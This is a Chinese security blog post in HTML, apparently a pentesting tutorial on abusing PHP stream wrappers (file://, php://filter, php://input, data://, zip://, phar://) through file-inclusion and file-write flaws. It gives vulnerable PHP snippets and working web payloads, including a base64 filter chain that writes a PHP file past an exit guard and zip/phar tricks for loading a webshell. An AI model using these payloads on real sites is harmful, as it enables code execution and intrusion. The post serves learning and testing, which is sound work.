@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="Wileysec&#39;s blog">
+  <meta name="keyword" content="wileysec&#39;s blog,wiley,wileysec">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      PHP常见的利用协议 | Wileysec&#39;s Blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" rel="stylesheet">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  <script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <span>Wileysec's Blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/series/" class="item-link">Series</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/series/" class="menu-link">Series</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+    <div id="article-banner">
+  <h2>PHP常见的利用协议</h2>
+  <p class="post-date">2022-01-12</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<input type="hidden" value="http://example.com/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/de9f49bb405f.html">
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><blockquote>
+<p>  PHP伪协议就是PHP支持的一些协议，并且封装起来使用的协议，就叫伪协议</p>
+</blockquote>
+<h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><blockquote>
+<p>  file协议用来访问本地系统文件的，在渗透测试中常用来读取系统文件</p>
+</blockquote>
+<p>条件：</p>
+<ul>
+<li>allow_url_include 为 <code>On</code></li>
+</ul>
+<p>这里的协议比较容易理解，和访问本地系统文件一样读取就可以了</p>
+<p><code>file://C:\\windows\\win.ini</code></p>
+<p><img src="/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/de9f49bb405f/image-20220111150735999.png" alt="image-20220111150735999"></p>
+<h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><blockquote>
+<p>  这种协议一般出现在PHP的文件读取写入函数中</p>
+</blockquote>
+<p>条件：</p>
+<ul>
+<li>allow_url_include 为 <code>On</code></li>
+</ul>
+<p>简单理解一下这个协议，它能够处理数据流，比如读取文件时通过base64进行加密输出</p>
+<p><code>php://filter/read=convert.base64-encode/resource=../../config/database.php</code></p>
+<p><img src="/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/de9f49bb405f/image-20220111151537671.png" alt="image-20220111151537671"></p>
+<p>再来看个例子，也是实战中比较多的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在写入文件之前，加入一个PHP的退出函数</p>
+<p>输入Payload为 <code>txt=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=convert.base64-decode/resource=a.php</code> 时报错了</p>
+<p><img src="/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/de9f49bb405f/image-20220111155346260.png" alt="image-20220111155346260"></p>
+<p>这是由于base64编码，在解码时是4个字节为一组，如果不足在编码前补充对应字符</p>
+<p><code>txt=bbPD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=a.php</code></p>
+<p><img src="/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/de9f49bb405f/image-20220111155917655.png" alt="image-20220111155917655"></p>
+<p>此时成功写入</p>
+<p>还有一个方法，使用这个协议的 <code>string.strip_tags</code> 方法，XML遇到PHP标签时，会解析成XML标签，使用这个方法可以删除这个标签，然后再处理输入流</p>
+<p><code>txt=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=a.php</code></p>
+<p>详细过程看：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><blockquote>
+<p>  输入流input，访问请求的原始输入流，当 <code>enctype=&quot;multipart/form-data&quot;</code> 的时候，php:&#x2F;&#x2F;input 是无效的，只要 <code>enctype</code> 值不是 <code>multipart/form-data</code> ，这个协议就管用</p>
+</blockquote>
+<p>条件：</p>
+<ul>
+<li>allow_url_include 为 <code>On</code></li>
+<li>enctype 值不为 <code>multipart/form-data</code></li>
+</ul>
+<p>看一个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里就可以使用 <code>php://input</code> 协议</p>
+<p><img src="/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/de9f49bb405f/image-20220111171646264.png" alt="image-20220111171646264"></p>
+<p>这里有一个很疑惑的点，输入流原始数据必须符合参数化形式，不然不会被执行，网上很多文章都是不需要的，PHP5.4版本貌似没用</p>
+<h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><blockquote>
+<p>  <code>data://</code> 数据流封装器，漏洞出现在PHP文件包含处</p>
+</blockquote>
+<p>条件：</p>
+<ul>
+<li>allow_url_include 为 <code>On</code></li>
+<li>allow_url_fopen 为 <code>On</code></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>?p=data://text/plain;base64,YWFhYWFhYQ==</code></p>
+<p>该协议常用来封装数据，可以使用base64进行加密传输，输出时可自动解密为明文 <code>aaaaaaa</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>?p=data://text/plain,&lt;?php phpinfo();?&gt;</code></p>
+<p><code>?p=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B</code></p>
+<p>在base64编码后，需要对base64编码特殊字符做URL编码，否则浏览器识别不了</p>
+<h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><blockquote>
+<p>  <code>zip://</code> 伪协议的格式为 <code>zip://[压缩文件路径]#[压缩文件内的子文件名]</code></p>
+</blockquote>
+<p>将PHP文件放在一个文件夹中，将这个文件夹压缩成ZIP格式，再将压缩文件后缀改为 <code>.jpg</code></p>
+<p>这里需要注意的是 <code>#</code> 需要进行URL编码</p>
+<p>常用于在文件包含中使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>?p=zip://a.jpg%231.php</code></p>
+<p>将1.php写成一句话木马，通过Webshell管理工具进行连接</p>
+<h2 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h2><blockquote>
+<p>  <code>phar</code> 是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
+</blockquote>
+<p>在这里，我测试了很多网上的方法，只测试成功了一个</p>
+<p>首先，这里要创建一个 <code>phar</code> ，在本地写好并且运行创建</p>
+<p>在本地创建的时候注意了，将 <code>php.ini</code> 中的 <code>phar.readonly</code> 设置为Off，否则无法生成phar文件</p>
+<p>使用命令 <code>php 1.php</code> 执行后，会在当前目录生成一个 <code>a.zip</code> 文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">PharData</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/a.zip&#x27;</span>, <span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>,<span class="title class_">Phar</span>::<span class="variable constant_">ZIP</span>); </span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./a.php&#x27;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;a.jpg&#x27;</span>, <span class="variable">$x</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// a.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>a.zip</code> 为创建的phar文件名，这里使用的是 <code>zip</code> 格式，读取一句话木马文件 <code>a.php</code> 写入到phar压缩包中的 <code>a.jpg</code> 中</p>
+<p>若文件包含可控，直接传入参数 <code>phar://a.zip/a.jpg</code> 即可执行我们想要执行的代码</p>
+<p>还有一些其他操作：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ningskyer/articles/14321607.html">https://www.cnblogs.com/ningskyer/articles/14321607.html</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#PHP" >
+    <span class="tag-code">PHP</span>
+  </a>
+
+  <a href="/tags#协议" >
+    <span class="tag-code">协议</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/618dcd2c2088.html">
+        <span class="nav-arrow">← </span>
+        
+          云函数的代理IP利用面
+        
+      </a>
+    
+    
+  </div>
+
+    <!-- NAV END -->
+    <hr/>
+    
+        <div id="vcomments"></div>
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">TOC</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#file-x2F-x2F"><span class="toc-nav-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#php-x2F-x2F"><span class="toc-nav-text">php:&#x2F;&#x2F;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#php-x2F-x2F-filter"><span class="toc-nav-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#php-x2F-x2F-input"><span class="toc-nav-text">php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#data-x2F-x2F"><span class="toc-nav-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#zip-x2F-x2F"><span class="toc-nav-text">zip:&#x2F;&#x2F;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#phar-x2F-x2F"><span class="toc-nav-text">phar:&#x2F;&#x2F;</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/技术分享/de9f49bb405f.html';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    // $(".markdown-content img").on('error', function() {
+    //   $(this).attr('src', '/css/images/error_icon.png')
+    //   $(this).css({
+    //     'cursor': 'default'
+    //   })
+    // })
+
+    // 对图片SRC进行处理
+    var page_url = window.location.pathname.split('.');
+    imglength = $('.post-article .markdown-content img').length;
+    for(i=0;i<imglength;i++){
+       obj = $(".post-article .markdown-content img")[i];
+       var img = obj.src.split('/')[5];
+       obj.src = page_url[0] + "/" + img
+    }
+
+    $('.post-article .markdown-content img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+
+      var src = this.getAttribute('src');
+      var idx = src.lastIndexOf('?');
+      if (idx != -1) {
+          src = src.substring(0, idx);
+      }
+      $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+          $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+
+    // fancybox image
+    // imglength = $('.post-article .markdown-content img').length;
+    // for(i=0;i<imglength;i++){
+    //    obj = $(".post-article .markdown-content img")[i];
+    //    aobj = $(obj).wrap("<a data-fancybox='gallery' no-pjax='' data-type='image' href='' id='fancybox" + i + "'></a>");
+    //    imghref = $(aobj).attr('src');
+    //    $('#fancybox' + i).attr('href',imghref);
+    // }
+
+
+    // zoom image
+    // $(".markdown-content img").on('click', function() {
+    //   var src = $(this).attr('src')
+    //   if (src !== '/css/images/error_icon.png') {
+    //     var imageW = $(this).width()
+    //     var imageH = $(this).height()
+
+    //     var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+    //     zoom = zoom < 1 ? 1 : zoom
+    //     zoom = zoom > 2 ? 2 : zoom
+    //     var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+    //     $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+    //     $('.image-view-wrap').addClass('wrap-active')
+    //     $('.image-view-wrap img').css({
+    //       'width': `${imageW}`,
+    //       'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+    //     })
+    //     $('html').css('overflow', 'hidden')
+
+    //     $('.image-view-wrap').on('click', function() {
+    //       $(this).remove()
+    //       $('html').attr('style', '')
+    //     })
+    //   }
+    // })
+  })();
+</script>
+
+<input type="hidden" id="valine_appid" value="GwvNoIVYwbmwRKo2fr9bcJHp-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="9olsAGq7SGWYUVcmI5RDrXid">
+
+<script src="/js/highlight/highlight.pack.js"></script>
+
+<script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    Copyright &copy; 2022 Wileysec's Blog · <a href="https://beian.miit.gov.cn/" target="_blank">皖ICP备18006273号-1</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+
+
+<script src="/js/script.js"></script>
+
+  </body>
+</html>
